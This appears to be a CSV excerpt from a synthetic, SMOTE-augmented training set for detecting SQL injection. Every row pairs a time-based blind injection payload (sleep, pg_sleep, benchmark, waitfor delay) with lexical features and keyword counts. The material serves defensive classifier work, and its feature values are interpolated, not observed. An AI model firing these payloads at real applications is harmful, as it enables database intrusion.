id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000158,attack,time,1'  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  ) ,nearest_attack_euclidean,R000136,0.4603110842779618,82.3986701248872,19.800664937556398,2.9221254087880992,27.0,2.0,42.1993350624436,11.199335062443602,0.32770556135714946,0.024274486026455502,0.5121372430132277,0.13588270960316728,1.0,0.0,0.0,0.0,1.0,-1.1102230246251565e-16,0.0,9.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.19933506244360277,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,-2.7755575615628914e-17,1.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000159,attack,time,1'   )    )    and sleep  (  5  )   and    (    (   'tcwt'  =  'tcwt,nearest_attack_euclidean,R000205,0.703526616728434,68.59274792575368,18.18549585150737,2.861278730550278,19.592747925753685,2.0,36.0,11.0,0.2855135815886409,0.029162710955565677,0.5249287972001822,0.16039491025561123,4.0,0.0,0.0,0.0,0.0,1.0,0.0,6.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,1.7036260371231573,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7036260371231573
SMOTE_000160,attack,time,"1"" or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #",nearest_attack_euclidean,R000177,0.11034501775660643,79.42629200949756,19.0,2.9659483013391,27.0,2.0,39.34103360759805,11.085258401899512,0.340037690738934,0.02518797709177288,0.49522547718954807,0.13954885497974506,0.0,1.0,0.0,0.0,1.0,-1.1102230246251565e-16,0.0,8.085258401899512,0.0,0.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,-2.7755575615628914e-17,1.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000161,attack,time,1%'   )    )     )   or sleep  (  5  )   and    (    (     (  '%'  =  ',nearest_attack_euclidean,R000125,1.2340854556084602,72.63729358186472,17.27288226364412,2.4391336103793284,12.183058109152967,2.0,44.0,14.454235472711758,0.16620160781620874,0.027570040760247036,0.6065408967254348,0.1996874546981094,4.0,0.0,0.0,0.0,0.0,1.0,0.0,8.0,1.4542354727117586,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000162,attack,time,"1""  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000028,0.37212821977545407,69.3072741253905,23.173181468652373,3.411448153538953,19.0,10.0,30.307274125390506,10.0,0.2742774440730693,0.14435654951214175,0.43700945690264714,0.14435654951214175,0.0,1.0,2.0,0.0,0.0,1.0,0.0,4.826818531347627,0.17318146865237355,1.0,0.0,3.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,-2.7755575615628914e-17,1.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000163,attack,time,"1'  )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000064,0.11380236348301474,72.95373637099459,24.09252725801083,3.5537561822137422,16.90747274198917,19.092527258010833,28.0,8.953736370994585,0.23174124654838307,0.2617263125543937,0.38380810152438194,0.1227243393728412,1.0,0.0,0.0,0.0,0.0,1.0,0.0,5.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.9537363709945847,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000164,attack,time,"1 where 6383  =  6383 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000281,0.4664082703902582,73.01161429558847,22.33720476519616,3.4135549690443203,15.0,18.0,30.674409530392314,9.337204765196157,0.20563137207374876,0.24675764648849846,0.4199090201781682,0.1277019612595846,0.1686023825980787,0.0,2.0,0.0,0.0,2.0,0.0,4.1686023825980785,0.0,0.0,1.0,4.0,0.16860238259807858,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000165,attack,time,"1'  )   where 4778  =  4778 and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000246,0.6378394823993998,76.59676736576382,24.0,3.397739252545955,16.0,18.0,33.06451157717588,9.53225578858794,0.20912601890095778,0.23526677126357748,0.43139989540308915,0.12420731443237555,0.7661278942939702,0.0,0.0,0.0,0.0,2.0,0.0,4.76612789429397,0.0,0.0,1.0,2.0,0.7661278942939702,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000166,attack,time,1' and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000078,1.2190111340802967,68.0553093047697,25.509218217461616,3.543845782714443,20.0,10.0,29.036872869846466,9.018436434923233,0.294451530640218,0.147225765320109,0.42619791664382195,0.13212478739585104,0.5092182174616164,0.0,2.0,0.0,0.0,1.0,0.0,4.509218217461616,0.0,1.0,0.0,3.0,0.5092182174616164,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,-2.7755575615628914e-17,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000167,attack,time,"1""  )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000103,0.266092160168366,72.02435714624974,24.0,3.5717361061874695,17.0,19.0,27.219485716999788,8.804871429249948,0.2362179549785968,0.26400830262313757,0.3775867158029798,0.12218702659528576,0.0,1.0,0.0,0.0,0.0,1.0,0.0,4.804871429249947,0.0,0.0,1.0,1.0,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000168,attack,time,"1""   )    )     )   waitfor delay '0:0:5' and    (    (     (  ""tuhy"" like ""tuhy",nearest_attack_euclidean,R000302,0.279081311865452,79.2240582013879,23.92945983648981,3.4568566936889193,26.71783934595924,4.0,34.57675901893886,13.92945983648981,0.3372060826520409,0.05056227666566093,0.43628599356277753,0.17594564711952065,2.0,3.999999999999999,0.0,0.0,0.0,0.07054016351018999,0.0,5.85891967297962,0.0,0.0,0.0,0.07054016351019032,1.0,1.0,0.0,0.0,0.0,0.0705401635101901,1.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000169,attack,time,1 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  # lwfs,nearest_attack_euclidean,R000024,0.12920583752435313,82.89386551569231,21.106134484307685,3.0948654862049607,30.946932757846156,2.0,39.946932757846156,10.0,0.3733282147723887,0.02412795909097358,0.4819040306817698,0.12063979545486789,0.0,0.0,0.0,0.0,1.0,-1.1102230246251565e-16,0.0,8.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,-2.7755575615628914e-17,1.0,1.1102230246251565e-16,0.946932757846157,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.946932757846157
SMOTE_000170,attack,time,1' and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  ) ,nearest_attack_euclidean,R000249,0.773476970435249,78.24841883424277,21.0,3.0681866729037193,28.0,2.0,38.24841883424276,10.0,0.35784554895183424,0.02556039635370244,0.48879207292595106,0.1278019817685122,0.7515811657572352,0.24841883424276473,0.0,0.0,1.0,-1.1102230246251565e-16,0.0,8.0,0.0,0.0,0.0,1.0,0.7515811657572353,0.24841883424276467,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,-2.7755575615628914e-17,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000171,attack,time,1%'   )    )     )   rlike sleep  (  5  )   and    (    (     (  '%'  =  ',nearest_attack_euclidean,R000142,0.6464673720337691,73.24304876062902,17.747682920209677,2.4831768941223267,12.243048760629028,2.0,44.0,15.0,0.16688731907087379,0.027315169866528724,0.6009337370636321,0.2048637739989655,4.0,0.0,0.0,0.0,0.0,1.0,0.0,8.0,2.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,1.0,0.2523170797903238,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.252317079790324
SMOTE_000172,attack,time,1  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    ) ,nearest_attack_euclidean,R000199,0.7927926709428424,66.42824427002245,23.64236640503367,3.4114625696823575,20.64236640503367,10.0,28.785877864988777,7.0,0.31056847088497624,0.15056095305253467,0.43347790892571486,0.10539266713677425,0.0,0.0,0.0,0.0,0.0,1.0,0.0,4.785877864988776,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.21412213501122374,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,-2.7755575615628914e-17,1.0,0.7858778649887761,0.21412213501122387,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000173,attack,time,"1'  )   or elt  (  6272  =  6272,sleep  (  5   )    )    and   (  'tmbs'  =  'tmbs",nearest_attack_euclidean,R000215,0.5506170098238585,79.92141011670248,23.207858988329754,3.341352141403684,21.0,10.0,36.337128093361976,12.584282023340494,0.2634909193003469,0.12547186633349852,0.4536976489195441,0.1573395654466105,4.0,0.0,0.0,0.0,0.0,2.0,0.0,5.584282023340495,0.0,0.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000174,attack,time,"1%'  )   and elt  (  1210  =  1210,sleep  (  5   )    )    and   (  '%'  =  '",nearest_attack_euclidean,R000198,0.0146999526838915,76.98365840578234,18.986926724625867,3.026999436216435,13.9901950434694,9.973853449251736,38.019609913061196,15.0,0.18172326851843276,0.12953645951200582,0.4938908628942972,0.19484940907526427,4.0,0.0,0.0,0.0,0.0,1.9967316811564668,0.0,6.006536637687066,2.0,0.0,0.9967316811564669,1.996731681156467,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000175,attack,time,1'  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R000173,0.6269725859825157,84.33721000861375,19.337210008613752,2.9124510994646347,27.0,2.0,43.0,12.33721000861375,0.32015340753045224,0.023715067224477943,0.5098739453262757,0.14625757991879412,1.0,0.0,0.0,0.0,1.0,-1.1102230246251565e-16,0.0,9.0,0.33721000861375017,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,-2.7755575615628914e-17,1.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000176,attack,time,"1""  )   or elt  (  6272  =  6272,sleep  (  5   )    )    and   (  ""dplf"" like ""dplf",nearest_attack_euclidean,R000077,1.5206582326277653,79.31969941447508,23.182155425438907,3.4638455264067347,25.408922287280546,10.0,32.72862170175563,11.182155425438907,0.32171085387209514,0.12647395080678103,0.41109840806327164,0.14071678725785222,0.0,3.999999999999999,0.0,0.0,0.0,1.0,0.0,5.182155425438908,0.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,1.4089222872805462,0.5910777127194538,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000177,attack,time,1%' or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and '%'  =  ',nearest_attack_euclidean,R000161,0.35721225060385225,77.60189055699972,27.0,3.6100323421441667,21.86729685233324,10.0,32.86729685233324,12.86729685233324,0.28176772831695135,0.12891401254095491,0.42357314211200175,0.16574511703009193,3.80094527849986,0.0,0.13270314766675972,0.0,0.0,1.93364842616662,0.0,4.06635157383338,1.9336484261666202,1.0,0.0,2.06635157383338,1.0,0.0,0.06635157383337986,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,-2.7755575615628914e-17,1.0,1.0,0.9336484261666202,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.93364842616662
SMOTE_000178,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and 'fgcg'  =  'fgcg",nearest_attack_euclidean,R000299,0.04381493448284874,80.0,28.14233575083044,3.974331386405609,31.0,15.0,25.0,9.0,0.3875,0.1875,0.3125,0.1125,3.0,0.0,0.0,0.0,0.0,1.0,0.0,4.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,1.0,0.0,-2.7755575615628914e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000179,attack,time,"1%"" or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and ""%""  =  """,nearest_attack_euclidean,R000240,1.1625981223834436,80.16041248881271,26.540103122203178,3.723531629630743,17.77005156110159,20.540103122203178,29.540103122203178,12.310154683304765,0.22186170125440038,0.2562491420164129,0.36873369831184566,0.15315545841734107,0.0,3.3101546833047646,0.0,0.0,0.0,1.7700515611015881,0.0,4.229948438898411,1.7700515611015883,0.0,1.0,1.7700515611015881,0.0,1.0,0.0,0.22994843889841177,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.7700515611015882,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7700515611015883
SMOTE_000180,attack,time,1'   )    )     )   or sleep  (  5  )   and    (    (     (  'wuwv'  =  'wuwv,nearest_attack_euclidean,R000293,0.038926065215309176,77.01421475981674,18.957355720549764,2.6531593367803774,18.014214759816745,2.0,44.0,13.0,0.2339058725989324,0.02596929245427347,0.5713244339940164,0.16880040095277762,4.0,0.0,0.0,0.0,0.0,1.0,0.0,8.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,1.014214759816745,0.985785240183255,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000181,attack,time,1  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  ) ,nearest_attack_euclidean,R000126,0.07176675336647553,81.03241532665675,19.032415326656754,2.8713448271954585,27.0,2.0,42.0,10.032415326656755,0.3332015637127774,0.024681597312057588,0.5183135435532092,0.12380329542195567,0.03241532665675506,0.0,0.0,0.0,1.0,-1.1102230246251565e-16,0.0,9.0,0.0,0.0,0.0,1.0,0.03241532665675495,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,-2.7755575615628914e-17,1.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000182,attack,time,1   )    )     )   rlike sleep  (  5  )   and    (    (     (  6790  =  6790,nearest_attack_euclidean,R000296,1.172271966856846,71.95136770933304,19.065700240615318,2.658741895910787,12.065700240615318,10.0,41.50853397497418,8.377133493743544,0.16721500377306486,0.1400347374491791,0.5766057650140735,0.11614449376368254,0.0,0.0,0.0,0.0,0.0,1.0,0.0,7.377133493743544,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,1.0,0.3114332531282279,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.311433253128228
SMOTE_000183,attack,time,"1%'  )   and elt  (  1210  =  1210,sleep  (  5   )    )    and   (  '%'  =  '",nearest_attack_euclidean,R000198,0.26794383993505677,75.96243160953262,19.0,3.047612845325332,14.0,10.0,37.16994528762609,14.792486321906525,0.18463383552365636,0.131881311088326,0.48876010583155066,0.19472474755646696,4.0,0.0,0.0,0.0,0.0,2.0,0.0,5.792486321906524,2.0,0.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000184,attack,time,1'   )    )    as hxxm where 3792  =  3792 and sleep  (  5  )  #,nearest_attack_euclidean,R000119,0.5815351446802102,63.74932991095884,23.49865982191768,3.4097129016402192,19.0,10.0,28.0,6.74932991095884,0.29805623305847767,0.1568717016097251,0.43924076450723026,0.10583130082456693,0.7493299109588398,0.0,0.0,0.0,0.0,1.0,0.0,4.0,0.0,0.0,0.0,1.0,0.7493299109588397,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000185,attack,time,1   )    )    as uadn where 9588  =  9588 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000148,1.4739982452512113,64.15292449994206,22.0,3.3272751447172433,19.729386749913083,10.0,28.0,6.423537750028973,0.3072524357132032,0.1559147142858558,0.4365612000003962,0.10027165000054479,0.0,0.4235377500289728,0.0,0.0,0.0,1.0,0.0,4.0,0.0,0.0,0.0,1.0,0.0,0.4235377500289728,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.1102230246251565e-16,0.423537750028973,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.4235377500289728
SMOTE_000186,attack,time,"1""   )    )    and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000222,0.4277252137810868,79.94239618255057,27.17626730290824,3.571332053062998,16.0,21.0,32.94239618255057,10.0,0.20031632281138945,0.26291517368994866,0.4115708017415434,0.12519770175711842,0.0,1.0,0.0,0.0,0.0,1.0,0.0,5.823732697091761,0.1762673029082393,0.0,1.0,1.0,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000187,attack,time,"1""   )    )     )   or sleep  (  5  )   and    (    (     (  ""eran""  =  ""eran",nearest_attack_euclidean,R000045,0.8205979323073013,77.23579103219421,16.471582064388436,2.601154368097256,18.943164128776875,2.0,43.528417935611564,12.764208967805782,0.245151415140913,0.025895507481786803,0.5636552406968939,0.16529783668040632,0.0,3.999999999999999,0.0,0.0,0.0,0.7642089678057816,0.0,8.0,0.0,0.0,0.0,0.7642089678057816,0.0,1.0,0.0,0.0,0.0,0.7642089678057816,1.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000188,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )   -- sztf",nearest_attack_euclidean,R000057,0.10980095120732315,66.16250734252051,27.023215334645787,3.9754451578718104,23.883923326771065,15.139292007874722,20.11607667322894,7.023215334645787,0.3612367711387294,0.22867489879242922,0.3039458102081153,0.10614251986072612,0.0,0.0,2.0,0.0,0.0,0.023215334645787178,0.0,4.0,0.0,0.0,1.0,2.023215334645787,0.0,0.0,1.0,0.0,0.0,0.023215334645787178,1.0,0.0,0.0,0.9999999999999999,0.0,0.9767846653542128,0.0,-2.7755575615628914e-17,0.0,1.1102230246251565e-16,0.023215334645787233,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
